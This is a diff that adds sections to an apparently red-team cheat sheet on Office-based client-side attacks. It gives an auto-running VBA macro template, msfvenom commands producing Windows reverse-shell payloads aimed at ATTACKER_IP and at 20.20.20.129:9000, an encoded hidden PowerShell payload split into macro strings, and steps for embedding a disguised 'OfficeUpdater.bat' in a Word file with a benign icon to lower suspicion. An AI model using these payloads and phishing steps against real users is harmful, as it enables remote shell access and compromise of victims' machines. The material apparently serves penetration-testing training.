@@ -112,3 +112,60 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<ATTACKER_PORT> 
 ### [Demiguise Tool](https://github.com/nccgroup/demiguise)
 
 ---
+
+# Office Macros
+### macro layout
+```vbscript
+Sub AutoOpen()
+    MyMacro
+End Sub
+Sub Document_Open()
+    MyMacro
+End Sub
+Sub MyMacro()
+    Dim Str As String
+
+    <PAYLOAD>
+
+    CreateObject("Wscript.Shell").Run Str
+End Sub
+```
+
+### Payload is the same as the HTA attack
+```bash
+msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<ATTACKER_PORT> -f hta-psh
+```
+In VBA, for strings, there is a character limit of 255 characters.
+
+However, this restriction does not apply to strings stored in variables, so we can split the command into multiple lines and concatenate them.
+
+it should be like below: 
+
+```vbscript
+Str = "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewAkAGIAPQAnAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAnAH0AZQBsAHMAZQB7ACQAYgA9ACQAZQBuAHYAOgB3AGkAbgBkAGkAcgArACcAXABzAHkAcwB3AG8AdwA2ADQAXABXAGkAbgBkAG8AdwBzAF"
+Str = Str + "AAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACcAfQA7ACQAcwA9AE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHMAUwB0AGEAcgB0AEkAbgBmAG8AOwAkAHMALgBGAGkAbABlAE4AYQBtAGUAPQAkA"
+```
+
+the powershell script in the **MurderShell project** can take care of the splitting.
+
+---
+
+# Object Linking and Embedding (Awesome)
+
+## Step #1: create a malicous bat file and give it a benign name like `OfficeUpdater.bat`
+```bash
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=20.20.20.129 LPORT=9000 -f psh-cmd -o OfficeUpdater.bat
+```
+## Step #2: create an office word document. click `insert` --> `object`
+![CSA-OLE-1](/Assets/CSA-Object-Linking-and-Embedding/CSA-OLE-1.jpg)
+
+## Step #3: After selecting the `create from file` tab, browse to the location of the `.bat` file we generated. Also use a benign `icon` and `caption` to lower suspicion.
+![CSA-OLE-2](/Assets/CSA-Object-Linking-and-Embedding/CSA-OLE-2.jpg)
+
+![CSA-OLE-3](/Assets/CSA-Object-Linking-and-Embedding/CSA-OLE-3.jpg)
+
+## Step #4: When the user clicks on the object, a pop-up will be there asking if the user wants to run it.
+![CSA-OLE-4](/Assets/CSA-Object-Linking-and-Embedding/CSA-OLE-4.jpg)
+
+## You will get back a shell if `'Run'` is clicked
+![CSA-OLE-5](/Assets/CSA-Object-Linking-and-Embedding/CSA-OLE-5.jpg)
